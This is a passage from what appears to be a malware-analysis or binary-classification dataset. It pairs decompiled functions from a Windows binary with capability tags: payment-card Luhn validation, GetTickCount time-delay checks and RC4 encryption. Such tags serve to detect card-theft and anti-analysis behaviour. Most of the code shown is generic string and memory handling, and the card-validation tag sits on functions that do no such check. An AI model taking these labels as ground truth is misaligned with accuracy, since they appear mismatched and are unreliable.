        "decompiled_code": "\nuint32_t fcn.0040f847(uint32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (param_1 < 0x100) {\n        return *(*0x4417c4 + (param_1 & 0xffff) * 2) & param_2;\n    }\n    if (param_1 == 0xffff) {\n        return 0;\n    }\n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    uVar2 = fcn.0040f7f0(iVar1, param_1, param_2);\n    return uVar2;\n}\n",
        "token_count": 186
    },
    "0040fc80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0040fc80(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 167
    },
    "0040fe0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fe0a(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x4431d8;\n    while( true ) {\n        if (*0x4431d8 + *0x4431d4 * 0x14 <= uVar1) {\n            return 0;\n        }\n        if (param_1 - *(uVar1 + 0xc) < 0x100000) break;\n        uVar1 = uVar1 + 0x14;\n    }\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "0041014d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0041014d(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (*0x4431d4 == *0x4431e4) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x4431ec, 0, *0x4431d8, (*0x4431e4 * 5 + 0x50) * 4);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n        *0x4431e4 = *0x4431e4 + 0x10;\n        *0x4431d8 = iVar2;\n    }\n    puVar1 = *0x4431d8 + *0x4431d4 * 0x14;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4431ec, 8, 0x41c4);\n    puVar1[4] = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100000, 0x2000, 4);\n        puVar1[3] = iVar2;\n        if (iVar2 != 0) {\n            puVar1[2] = 0xffffffff;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *0x4431d4 = *0x4431d4 + 1;\n            *puVar1[4] = 0xffffffff;\n            return puVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4431ec, 0, puVar1[4]);\n    }\n    return NULL;\n}\n",
        "token_count": 394
    },
    "00410ed4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410ed4(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t var_2ch;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    fcn.00416ed1(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.00416da0((0 < arg_10h) + (var_2ch == 0x2d) + arg_ch, arg_10h + 1, &var_2ch);\n    fcn.00410e26(arg_10h, arg_14h, 0);\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 189
    },
    "00410fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410fdc(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    fcn.00416ed1(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.00416da0((var_2ch == 0x2d) + arg_ch, var_28h + arg_10h, &var_2ch);\n    fcn.00410f40(arg_ch, arg_10h, 0);\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 182
    },
    "0041103e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041103e(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    char *arg_8h_00;\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    fcn.00416ed1(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    iVar1 = var_28h + -1;\n    arg_8h_00 = (var_2ch == 0x2d) + arg_ch;\n    fcn.00416da0(arg_8h_00, arg_10h, &var_2ch);\n    var_28h = var_28h + -1;\n    if ((var_28h < -4) || (arg_10h <= var_28h)) {\n        fcn.00410e26(arg_10h, arg_14h, 1);\n    }\n    else {\n        if (iVar1 < var_28h) {\n            do {\n                pcVar2 = arg_8h_00;\n                arg_8h_00 = pcVar2 + 1;\n            } while (*pcVar2 != '\\0');\n            pcVar2[-1] = '\\0';\n        }\n        fcn.00410f40(arg_ch, arg_10h, 1);\n    }\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 367
    },
    "0041121c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041121c(uint param_1)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    \n    if (*0x4412dc != NULL) {\n        (**0x4412dc)(param_1);\n    }\n    iVar1 = 0;\n    ppcVar2 = 0x440534;\n    do {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*ppcVar2 != NULL) {\n            iVar1 = (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x44084c);\n    if (iVar1 == 0) {\n        fcn.0040d8dd(0x411df0);\n        ppcVar2 = 0x440000;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x440430);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 256
    },
    "00411dac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00411dac(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bd68, 0xc);\n    *(unaff_EBP + -0x1c) = 0x43e71c;\n    while (*(unaff_EBP + -0x1c) < 0x43e81c) {\n        *(unaff_EBP + -4) = 0;\n        if (**(unaff_EBP + -0x1c) != NULL) {\n            (***(unaff_EBP + -0x1c))();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n    }\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 229
    },
    "00411ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00411ee0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x00411f33;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x00411f45;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x00411f45;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x00411f45;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x00411f33:\n    puVar5 = puVar3 + -1;\ncode_r0x00411f45:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00411fc0;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x00411fc0:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 752
    },
    "00411ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00411ed0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00411fc0;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x00411fc0:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "0041296c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041296c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f262();\n    return iVar1 + 8;\n}\n",
        "token_count": 43
    },
    "00412975": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00412975(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f262();\n    return iVar1 + 0xc;\n}\n",
        "token_count": 43
    },
    "00413df4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413df4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    fcn.00413d2f(iVar1, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 139
    },
    "00414cb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00414cb5(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = 0;\n    while (cVar2 = *param_2,  cVar2 != '\\0') {\n        param_2 = param_2 + 1;\n        if ((cVar2 < 'a') || ('f' < cVar2)) {\n            if (('@' < cVar2) && (cVar2 < 'G')) {\n                cVar2 = cVar2 + -7;\n            }\n        }\n        else {\n            cVar2 = cVar2 + -0x27;\n        }\n        iVar1 = (iVar1 + 0xffffffd) * 0x10 + cVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 185
    },
    "00415580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00415580(char *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = arg_10h;\n    pcVar6 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = arg_10h - uVar4;\n        do {\n            pcVar6 = arg_ch;\n            pcVar7 = arg_8h;\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            pcVar7 = arg_8h + 1;\n            pcVar6 = arg_ch + 1;\n            cVar1 = *arg_ch;\n            cVar2 = *arg_8h;\n            arg_ch = pcVar6;\n            arg_8h = pcVar7;\n        } while (cVar1 == cVar2);\n        uVar3 = pcVar6[-1];\n        arg_10h = 0;\n        bVar8 = uVar3 == pcVar7[-1];\n        if (uVar3 < pcVar7[-1] || bVar8) {\n            if (bVar8) {\n                return 0;\n            }\n            arg_10h = 0xfffffffe;\n        }\n        arg_10h = ~arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 414
    },
    "0041580c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.0041580c(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint noname_2;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_ch + 1 < 0x101) {\n        arg_ch._2_2_ = *(*(arg_8h + 0x48) + arg_ch * 2);\n    }\n    else {\n        if ((*(*(arg_8h + 0x48) + 1 + (arg_ch >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            var_4h = in_ECX & 0xffff0000 | arg_ch & 0xff;\n            noname_2 = 1;\n        }\n        else {\n            var_4h = CONCAT11(arg_ch, arg_ch >> 8);\n            var_4h = in_ECX & 0xff000000 | var_4h;\n            noname_2 = 2;\n        }\n        iVar1 = fcn.004153b8(1, &var_4h, noname_2, &arg_ch + 2, *(arg_8h + 4), *(arg_8h + 0x14), 1, var_4h, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return arg_ch._2_2_ & arg_10h;\n}\n",
        "token_count": 429
    },
    "00415d24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00415d24(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    uVar1 = param_2;\n    do {\n        if (*(uVar1 + 4) == unaff_ESI) break;\n        uVar1 = uVar1 + 0xc;\n    } while (uVar1 < param_2 + *0x441a2c * 0xc);\n    if ((param_2 + *0x441a2c * 0xc <= uVar1) || (*(uVar1 + 4) != unaff_ESI)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 167
    },
    "00416c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416c40(uint param_1, uint param_2)\n\n{\n    fcn.00416ae8(param_1, param_2, 0x441dd8);\n    return;\n}\n",
        "token_count": 47
    },
    "00416c56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416c56(uint param_1, uint param_2)\n\n{\n    fcn.00416ae8(param_1, param_2, 0x441df0);\n    return;\n}\n",
        "token_count": 47
    },
    "00416ce8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416ce8(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    fcn.00418a14(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.00416c40(&var_10h, arg_8h);\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 123
    },
    "00416d25": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416d25(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    fcn.00418a14(&var_10h, &var_14h, arg_ch, 1, 0, 0, 0);\n    fcn.00416c6c(&var_10h, arg_8h);\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 124
    },
    "00416d63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416d63(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    fcn.00418a14(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.00416c56(&var_10h, arg_8h);\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 123
    },
    "00416da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416da0(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char *arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char cVar4;\n    \n    arg_8h_00 = arg_8h;\n    pcVar3 = *(arg_10h + 0xc);\n    arg_ch_00 = arg_8h + 1;\n    *arg_8h = '0';\n    pcVar1 = arg_ch_00;\n    if (0 < arg_ch) {\n        arg_8h = arg_ch;\n        arg_ch = 0;\n        do {\n            cVar4 = *pcVar3;\n            if (cVar4 == '\\0') {\n                cVar4 = '0';\n            }\n            else {\n                pcVar3 = pcVar3 + 1;\n            }\n            *pcVar1 = cVar4;\n            pcVar1 = pcVar1 + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != NULL);\n    }\n    *pcVar1 = '\\0';\n    if ((-1 < arg_ch) && ('4' < *pcVar3)) {\n        while (pcVar1 = pcVar1 + -1,  *pcVar1 == '9') {\n            *pcVar1 = '0';\n        }\n        *pcVar1 = *pcVar1 + '\\x01';\n    }\n    if (*arg_8h_00 == '1') {\n        *(arg_10h + 4) = *(arg_10h + 4) + 1;\n    }\n    else {\n        iVar2 = fcn.0040bc50(arg_ch_00);\n        fcn.0040ada0(arg_8h_00, arg_ch_00, iVar2 + 1);\n    }\n    return;\n}\n",
        "token_count": 438
    },
    "00416ed1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00416ed1(uint arg_8h, uint noname_1, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_stack_ffffffb8;\n    ushort uVar4;\n    uint var_2ch;\n    uchar var_28h [24];\n    uint var_10h;\n    uint uStack16;\n    ushort uStack12;\n    uint var_4h;\n    \n    uVar4 = in_stack_ffffffb8 >> 0x10;\n    var_4h = *0x441350;\n    fcn.00416e17(&var_10h, &arg_8h);\n    iVar3 = fcn.00418e94(var_10h, uStack16, CONCAT22(uVar4, uStack12), 0x11, 0, &var_2ch);\n    iVar2 = arg_14h;\n    piVar1 = arg_10h;\n    arg_10h[2] = iVar3;\n    *arg_10h = var_2ch._2_1_;\n    arg_10h[1] = var_2ch;\n    fcn.00411ed0(arg_14h, var_28h);\n    piVar1[3] = iVar2;\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 328
    },
    "00417fce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.00417fce(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBX;\n    uint32_t uVar6;\n    \n    if (*0x441e0c == 0) {\n        return false;\n    }\n    iVar1 = unaff_EBX[5];\n    if ((iVar1 != *0x441ea0) || (iVar1 != *0x441eac)) {\n        if (*0x442d6c == 0) {\n            fcn.00417e16(1, 1, iVar1, 1, 0, 0, 0, 0, 0);\n            fcn.00417e16(0, 1, iVar1, 5, 0, 0, 0, 0, 0);\n        }\n        else {\n            if (*0x442d58 != 0) {\n                uVar6 = *0x442d5e;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x442d5c;\n                uVar6 = 0;\n                uVar4 = *0x442d5e;\n            }\n            fcn.00417e16(1, *0x442d58 == 0, iVar1, uVar4, uVar3, uVar6, *0x442d62, *0x442d64, *0x442d66);\n            if (*0x442d04 != 0) {\n                uVar6 = *0x442d0a;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x442d08;\n                uVar6 = 0;\n                uVar4 = *0x442d0a;\n            }\n            fcn.00417e16(0, *0x442d04 == 0, iVar1, uVar4, uVar3, uVar6, *0x442d0e, *0x442d10, *0x442d12);\n        }\n    }\n    iVar1 = unaff_EBX[7];\n    if (*0x441ea4 < *0x441eb0) {\n        if ((iVar1 < *0x441ea4) || (*0x441eb0 < iVar1)) {\n            return false;\n        }\n        if ((*0x441ea4 < iVar1) && (iVar1 < *0x441eb0)) {\n            return true;\n        }\n    }\n    else {\n        if (iVar1 < *0x441eb0) {\n            return true;\n        }\n        if (*0x441ea4 < iVar1) {\n            return true;\n        }\n        if ((*0x441eb0 < iVar1) && (iVar1 < *0x441ea4)) {\n            return false;\n        }\n    }\n    iVar5 = ((unaff_EBX[2] * 0x3c + unaff_EBX[1]) * 0x3c + *unaff_EBX) * 1000;\n    if (iVar1 == *0x441ea4) {\n        bVar2 = *0x441ea8 <= iVar5;\n    }\n    else {\n        bVar2 = iVar5 < *0x441eb4;\n    }\n    return bVar2;\n}\n",
        "token_count": 765
    },
    "00418220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418220(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar5;\n    uint32_t uVar4;\n    \n    uVar4 = 0xff;\n    do {\n        do {\n            cVar2 = uVar4;\n            if (cVar2 == '\\0') goto code_r0x00418266;\n            cVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            cVar1 = *arg_8h;\n            uVar4 = CONCAT11(cVar1, cVar2);\n            arg_8h = arg_8h + 1;\n        } while (uVar4 >> 8 == cVar2);\n        uVar3 = cVar1 + 0xbf;\n        uVar3 = uVar3 + (-(uVar3 < 0x1a) & 0x20U) + 0x41;\n        uVar4 = CONCAT11(cVar2 + 0xbfU + (-(cVar2 + 0xbfU < 0x1a) & 0x20U) + 'A', uVar3);\n        uVar5 = uVar4 >> 8;\n    } while (uVar3 == uVar5);\n    cVar2 = (uVar3 < uVar5) * -2 + '\\x01';\ncode_r0x00418266:\n    return cVar2;\n}\n",
        "token_count": 335
    },
    "004191f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004191f0(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar2 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar2 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n                uVar2 = uVar2 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar3 = uVar2 < uVar1;\n            if (uVar2 != uVar1) goto code_r0x00419241;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar3 = uVar2 < uVar1;\n        if (uVar2 != uVar1) {\ncode_r0x00419241:\n            arg_10h = -1;\n            if (!bVar3) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 362
    },
    "00419527": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00419527(ushort *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_ch_00;\n    uint var_10h;\n    ushort uStack16;\n    ushort uStack14;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    iVar4 = 0x441ed0;\n    if (arg_ch != 0) {\n        if (arg_ch < 0) {\n            arg_ch = -arg_ch;\n            iVar4 = 0x442030;\n        }\n        if (arg_10h == 0) {\n            *arg_8h = 0;\n        }\n        while (arg_ch != 0) {\n            uVar1 = arg_ch >> 3;\n            uVar3 = arg_ch & 7;\n            iVar4 = iVar4 + 0x54;\n            arg_ch = uVar1;\n            if (uVar3 != 0) {\n                arg_ch_00 = iVar4 + uVar3 * 0xc;\n                if (0x7fff < *arg_ch_00) {\n                    var_10h._0_2_ = *arg_ch_00;\n                    var_10h._2_2_ = *arg_ch_00 >> 0x10;\n                    uStack16 = arg_ch_00[1];\n                    uStack14 = arg_ch_00[1] >> 0x10;\n                    uStack12 = arg_ch_00[2];\n                    iVar2 = CONCAT22(uStack16, var_10h._2_2_) + -1;\n                    var_10h._2_2_ = iVar2;\n                    uStack16 = iVar2 >> 0x10;\n                    arg_ch_00 = &var_10h;\n                }\n                fcn.004192f5(arg_8h, arg_ch_00);\n            }\n        }\n    }\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 478
    },
    "004195fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
